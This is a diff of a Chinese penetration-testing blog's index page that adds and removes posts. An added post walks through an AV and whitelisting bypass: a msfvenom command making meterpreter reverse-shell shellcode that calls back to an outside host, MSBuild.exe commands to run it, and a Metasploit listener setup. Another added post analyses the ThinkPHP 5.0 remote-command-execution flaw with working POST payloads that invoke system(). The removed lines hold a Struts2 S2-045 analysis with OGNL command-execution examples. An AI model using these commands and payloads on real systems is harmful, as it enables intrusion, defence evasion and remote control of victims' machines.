@@ -252,6 +252,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
+<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.png" alt=""></p>
+<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -403,7 +554,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="pplsec">
@@ -422,7 +573,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
+                <a class="post-title-link" href="/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/" itemprop="url">ThinkPHP5.0 Request类远程命令执行漏洞20190111</a></h1>
         
 
         <div class="post-meta">
@@ -434,8 +585,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
-                2019-03-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-16T21:20:32+08:00">
+                2019-02-16
               </time>
             
 
@@ -457,8 +608,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
                   </a>
                 </span>
 
@@ -496,16 +647,35 @@
       
         
           
-            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
-<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
-<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
-<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.png" alt=""></p>
-<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
-<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
-<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
-<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
+            <h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1)    漏洞简介"></a>1)    漏洞简介</h3><p>2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。</p>
+<p>ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Source: Request类的method() 方法中的：</span><br><span class="line">$this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">$this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line"></span><br><span class="line">Sink: Request类的filterValue() 方法中的回调函数：</span><br><span class="line">call_user_func($filter, $value)</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)    漏洞复现"></a>2)    漏洞复现</h3><h4 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15  POC:"></a>ThinkPHP 5.0.15  POC:</h4><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<h4 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23  POC:"></a>ThinkPHP 5.0.23  POC:</h4><p>下面POC  在debug模式无论关闭或开启均可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-漏洞分析-ThinkPHP-5-0-15"><a href="#3-漏洞分析-ThinkPHP-5-0-15" class="headerlink" title="3)    漏洞分析(ThinkPHP 5.0.15)"></a>3)    漏洞分析(ThinkPHP 5.0.15)</h3><h4 id="github-commit信息"><a href="#github-commit信息" class="headerlink" title="github commit信息"></a>github commit信息</h4><p>首先看下官方github commit信息<br><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br>library/think/Request.php的public function method($method = false)方法<br><img src="/images/ThinkPHP-RCE20190111-11.png" alt=""></p>
+<h4 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h4><p>以官网下载的ThinkPHP 5.0.15完整版进行分析，首先定位到漏洞关键点：<br>漏洞主要出现在Request 类的method 函数中<br>thinkphp5015\thinkphp/library/think/Request.php:501<br><img src="/images/ThinkPHP-RCE20190111-21.png" alt=""></p>
+<p>method()函数可以用来获取当前请求类型，如 GET、POST 等，当传入参数$method为false 的时候，会通过var_method 来配置$method</p>
+<p>508行method函数引入了一个外部可控的数据$_POST[Config::get[‘var_method’]。<br>在thinkphp5015\application\config.php中，可看到 ‘var_method’ 是表单请求伪变量，其默认值为 ‘_method’。<br><img src="/images/ThinkPHP-RCE20190111-22.png" alt=""></p>
+<p>取得$_POST[‘_method’]的值并将其赋值给$this-&gt;method，然后动态调用$this-&gt;{$this-&gt;method}($_POST)。这意味着攻击者可利用POST 参数可以实现对当前类的任意方法进行调用，通过调用当前类的构造方法可以实现任意覆盖成员属性的值。如果动态调用__construct构造函数，可以实现任意覆盖成员属性的值则会导致代码执行。</p>
+<p>在构造函数中，会判断其传入参数的key是否是该类属性，如果是，则将对应的value赋值给该属性，可以进行变量覆盖。<br><img src="/images/ThinkPHP-RCE20190111-23.png" alt=""> </p>
+<p>当<strong>method被赋值为</strong>construct之后，即$method参数为true 时，会通过server() 函数进入Request类的param()函数，进而input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br>最终调用filterValue()中的回调函数call_user_func() 实现任意命令执行</p>
+<p>当$method参数为true，进入server()：<br><img src="/images/ThinkPHP-RCE20190111-24.png" alt=""></p>
+<p>进入param()<br><img src="/images/ThinkPHP-RCE20190111-25.png" alt=""></p>
+<p>进入input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br><img src="/images/ThinkPHP-RCE20190111-26.png" alt=""></p>
+<p>1008行 array_walk_recursive($data, [$this, ‘filterValue’], $filter);<br>利用回调函数array_walk_recursive，进入filterValue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</span><br><span class="line">将用户自定义函数 callback 应用到 array 数组中的每个单元</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/ThinkPHP-RCE20190111-27.png" alt=""><br>1065行  call_user_func($filter, $value)  利用回调函数call_user_func() 触发漏洞，执行命令。</p>
+<h4 id="动态代码分析"><a href="#动态代码分析" class="headerlink" title="动态代码分析"></a>动态代码分析</h4><p>测试POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<p>加断点:<br><img src="/images/ThinkPHP-RCE20190111-31.png" alt=""></p>
+<p>__construct构造函数:<br><img src="/images/ThinkPHP-RCE20190111-32.png" alt=""></p>
+<p>Request.php类的method(),method设为了__construct:<br><img src="/images/ThinkPHP-RCE20190111-33.png" alt=""></p>
+<p>$method为true，进入server():<br><img src="/images/ThinkPHP-RCE20190111-34.png" alt=""></p>
+<p>进入param():<br><img src="/images/ThinkPHP-RCE20190111-35.png" alt=""></p>
+<p>return时进入input():<br><img src="/images/ThinkPHP-RCE20190111-36.png" alt=""></p>
+<p>进入getFilter()，并通过回调函数array_walk_recursive()进入filterValue()<br><img src="/images/ThinkPHP-RCE20190111-37.png" alt=""></p>
+<p>filterValue()中利用回调函数call_user_func() 触发漏洞，执行命令：<br><img src="/images/ThinkPHP-RCE20190111-38.png" alt=""></p>
+<h3 id="4-补丁中的修复方式"><a href="#4-补丁中的修复方式" class="headerlink" title="4)    补丁中的修复方式"></a>4)    补丁中的修复方式</h3><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br><img src="/images/ThinkPHP-RCE20190111-41.png" alt=""></p>
+<p>对$method增加白名单，限制为GET, POST, DELETE, PUT, PATCH<br>无法再调用__construct构造函数</p>
+<p><strong>参考:</strong><br><a href="https://nosec.org/home/detail/2163.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2163.html</a><br><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a>  </p>
 
           
         
@@ -1765,186 +1935,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/08/【Struts2-命令-代码执行漏洞分析系列】S2-045/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/08/【Struts2-命令-代码执行漏洞分析系列】S2-045/" itemprop="url">【Struts2-命令-代码执行漏洞分析系列】S2-045</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-08T09:38:36+08:00">
-                2018-09-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞分析</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>2018-09-08 首发于阿里先知: <a href="https://xz.aliyun.com/t/2712" target="_blank" rel="noopener">https://xz.aliyun.com/t/2712</a></p>
-<h3 id="0x00-OGNL表达式"><a href="#0x00-OGNL表达式" class="headerlink" title="0x00 OGNL表达式"></a>0x00 OGNL表达式</h3><h4 id="1-ognl基本介绍"><a href="#1-ognl基本介绍" class="headerlink" title="1) ognl基本介绍"></a>1) ognl基本介绍</h4><p>OGNL是Object-Graph Navigation Language（对象图导航语言）的缩写，它是一种功能强大的表达式语言(比EL更强大)，通过简单一致的表达式语法，可以存取对象的任何属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。<br>xwork提供了OGNL表达式。其jar包为ognl-x.x.x.jar。<br>Struts2框架使用OGNL作为默认的表达式语言。<br>OGNL有三大要素，分别是表达式、根对象、Context对象。<br>表达式是整个OGNL的核心，OGNL根据表达式去对象中取值。所有OGNL操作都是针对表达式解析后进行的。<br>根对象（Root）:Root对象可以理解为OGNL的操作对象，表达式规定了”做什么”，而Root对象则规定了”对谁操作”。OGNL称为对象图导航语言，所谓对象图，即以任意一个对象为根，通过OGNL可以访问与这个对象关联的其它对象。<br>Context对象:OGNL的取值还需要一个上下文环境。Root对象所在环境就是OGNL的上下文环境(Context)。上下文环境规定了OGNL的操作在哪里进行。上下文环境Context是一个Map类型的对象，在表达式中访问Context中的对象，需要使用”#”号加上对象名称，即#”对象名称”的形式，表示了与访问Root对象的区别。</p>
-<h4 id="2-ognl基本用法示例"><a href="#2-ognl基本用法示例" class="headerlink" title="2)ognl基本用法示例"></a>2)ognl基本用法示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlContext;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class ognltest1 &#123;</span><br><span class="line">	 public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">     //创建一个Ognl上下文对象</span><br><span class="line">     OgnlContext context = new OgnlContext();</span><br><span class="line"></span><br><span class="line">	 // 调用对象的方法 </span><br><span class="line">    Object obj1 = Ognl.getValue(&quot;&apos;helloworld123&apos;.length()&quot;, context, context.getRoot());</span><br><span class="line">    System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">    // 获取OGNL上下文的对象</span><br><span class="line">    context.put(&quot;name&quot;, &quot;lltest&quot;);</span><br><span class="line">    Object obj2 = Ognl.getValue(&quot;#name&quot;, context, context.getRoot());</span><br><span class="line">    System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">    //调用类静态方法</span><br><span class="line">    //@[类全名(包括包路径)]@[方法名|值名]</span><br><span class="line">    Object obj3 = Ognl.getValue(&quot;@java.lang.String@format(&apos;hello %s&apos;, &apos;lltest&apos;)&quot;, context);</span><br><span class="line">    System.out.println(obj3);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>说明：需要导入ognl-3.0.6.jar<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122928-c662d6fc-b31f-1.png" alt=""></p>
-<h4 id="3-ognl执行系统命令"><a href="#3-ognl执行系统命令" class="headerlink" title="3) ognl执行系统命令"></a>3) ognl执行系统命令</h4><p>用法： @[类全名(包括包路径)]@[方法名|值名]   即@包名.类名@方法名   如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&quot;, context);</span><br></pre></td></tr></table></figure></p>
-<p>完整示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlContext;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class OsExec &#123;</span><br><span class="line">	 public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">		 OgnlContext context = new OgnlContext();</span><br><span class="line">		//@[类全名(包括包路径)@[方法名|值名]]</span><br><span class="line">		 //执行命令</span><br><span class="line">		 Object obj = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&quot;, context);</span><br><span class="line">		 System.out.println(obj);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>说明：需要导入javassist-3.11.0.GA.jar和ognl-3.0.6.jar 两个jar包</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c67cc9cc-b31f-1.png" alt=""></p>
-<h3 id="0x01-S2-045漏洞简述"><a href="#0x01-S2-045漏洞简述" class="headerlink" title="0x01 S2-045漏洞简述"></a>0x01 S2-045漏洞简述</h3><p>Struts2默认处理multipart上传报文的解析器为Jakarta插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）。<br>但是Jakarta插件在处理文件上传(multipart)的请求时会捉捕异常信息，并对异常信息进行OGNL表达式处理。当content-type错误时会抛出异常并带上Content-Type属性值，可通过构造附带OGNL表达的请求导致远程代码执行。<br>影响Struts2版本： Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10<br>官方通告详情：<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-045</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c68caba8-b31f-1.png" alt=""></p>
-<h3 id="0x02-S2-045漏洞分析"><a href="#0x02-S2-045漏洞分析" class="headerlink" title="0x02 S2-045漏洞分析"></a>0x02 S2-045漏洞分析</h3><p>为复现漏洞，可使用struts2.3.x环境下自带的struts2-showcase演示demo示例环境，进行漏洞复现。下载struts-2.3.20-apps.zip  (<a href="http://archive.apache.org/dist/struts/2.3.20/" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/2.3.20/</a> )<br>或者自行编写简单测试样例，不去详述了。<br>下面使用eclipse对struts-2.3.20进行动态分析：</p>
-<h4 id="1-漏洞补丁对比"><a href="#1-漏洞补丁对比" class="headerlink" title="1) 漏洞补丁对比"></a>1) 漏洞补丁对比</h4><p><a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a?diff=split" target="_blank" rel="noopener">https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a?diff=split</a><br>主要对core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java中的<br>return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args);  进行删除，并重新定义<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6a78ad6-b31f-1.png" alt=""></p>
-<h4 id="2-Jakarta解析multipart上传请求"><a href="#2-Jakarta解析multipart上传请求" class="headerlink" title="2)Jakarta解析multipart上传请求"></a>2)Jakarta解析multipart上传请求</h4><p>Struts2默认处理multipart上传报文的解析器是plugin插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6ba53b4-b31f-1.png" alt=""></p>
-<p>StrutsPrepareAndExecuteFilter类是Struts2默认配置的入口过滤器。Struts2首先对输入请求对象request的进行封装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request = prepare.wrapRequest(request);</span><br></pre></td></tr></table></figure></p>
-<p>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\ng\filter\StrutsPrepareAndExecuteFilter.java<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6d47352-b31f-1.png" alt=""><br>跟进wrapRequest()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6e3210e-b31f-1.png" alt=""><br>继续跟进wrapRequest()<br>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\Dispatcher.java<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6f536be-b31f-1.png" alt=""></p>
